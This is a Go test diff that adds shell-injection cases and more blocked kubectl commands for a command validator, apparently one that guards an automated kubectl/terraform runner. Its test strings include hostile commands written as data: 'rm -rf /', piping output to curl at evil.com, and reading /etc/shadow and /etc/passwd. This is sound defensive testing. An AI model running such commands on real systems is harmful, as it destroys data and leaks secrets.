@@ -35,6 +35,39 @@ func TestRunCommand_AllowedCommand(t *testing.T) {
 	}
 }
 
+func TestRunCommand_ShellInjection(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name    string
+		command string
+	}{
+		{"semicolon chain", "kubectl get pods; rm -rf /"},
+		{"and chain", "kubectl get pods && curl evil.com"},
+		{"or chain", "kubectl get pods || curl evil.com"},
+		{"pipe", "kubectl get pods | curl -X POST evil.com"},
+		{"backtick", "kubectl get pods `curl evil.com`"},
+		{"dollar paren", "kubectl get pods $(curl evil.com)"},
+		{"dollar brace", "kubectl get pods ${HOME}"},
+		{"redirect out", "kubectl get pods > /etc/passwd"},
+		{"redirect in", "kubectl apply < /etc/shadow"},
+		{"newline", "kubectl get pods\ncurl evil.com"},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			err := validateRunCommand(tt.command, defaultAllowedPrefixes, defaultBlockedSubcommands)
+			if err == nil {
+				t.Errorf("validateRunCommand(%q) should reject shell metacharacter", tt.command)
+			}
+			if !strings.Contains(err.Error(), "metacharacter") {
+				t.Errorf("error should mention metacharacter, got: %s", err.Error())
+			}
+		})
+	}
+}
+
 func TestRunCommand_BlockedCommand(t *testing.T) {
 	t.Parallel()
 
@@ -47,6 +80,9 @@ func TestRunCommand_BlockedCommand(t *testing.T) {
 		{"rm files", "rm -rf /"},
 		{"kubectl edit", "kubectl edit deployment web"},
 		{"kubectl exec interactive", "kubectl exec -it pod -- bash"},
+		{"kubectl exec non-interactive", "kubectl exec pod -- cat /etc/passwd"},
+		{"kubectl run", "kubectl run test --image=alpine -- sh"},
+		{"kubectl debug", "kubectl debug pod/web --image=busybox"},
 		{"kubectl port-forward", "kubectl port-forward svc/web 8080:80"},
 		{"terraform console", "terraform console"},
 	}
